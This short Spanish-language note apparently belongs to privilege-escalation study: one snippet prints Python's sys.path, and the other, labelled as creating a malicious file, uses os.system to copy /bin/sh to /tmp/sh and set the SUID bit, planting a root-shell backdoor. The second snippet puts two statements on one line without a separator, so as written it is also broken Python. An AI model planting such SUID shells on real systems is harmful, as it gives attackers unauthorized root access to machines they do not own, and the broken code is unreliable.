
- Ver las rutas del python library
```python
import sys
sys.path
```


- Crear un archivo malicisoso en home
```python
import os os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")
```

